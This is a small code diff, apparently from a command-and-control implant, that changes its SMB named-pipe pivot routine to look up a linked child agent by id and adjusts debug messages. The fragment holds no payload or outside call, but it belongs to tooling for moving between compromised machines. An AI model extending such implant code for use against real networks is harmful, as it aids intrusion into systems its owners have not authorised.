@@ -815,10 +815,10 @@ auto DECLFN Task::Pivot(
 
             Self->Ntdll.DbgPrint( "[PIVOT] Exchange: pivotId=%s, data=%d bytes\n", PivotId, DataLen );
 
-            // Get child from the SMB linked list
-            SMB_PROFILE_DATA* Child = (SMB_PROFILE_DATA*)Self->Tsp->SmbList();
+            // Get specific child by its AgentId (server sends ChildAgentId as PivotId)
+            SMB_PROFILE_DATA* Child = (SMB_PROFILE_DATA*)Self->Tsp->SmbGet( PivotId );
             if ( ! Child || ! Child->PipePath ) {
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: no connected child\n" );
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child not found for id=%s\n", PivotId );
                 break;
             }
 
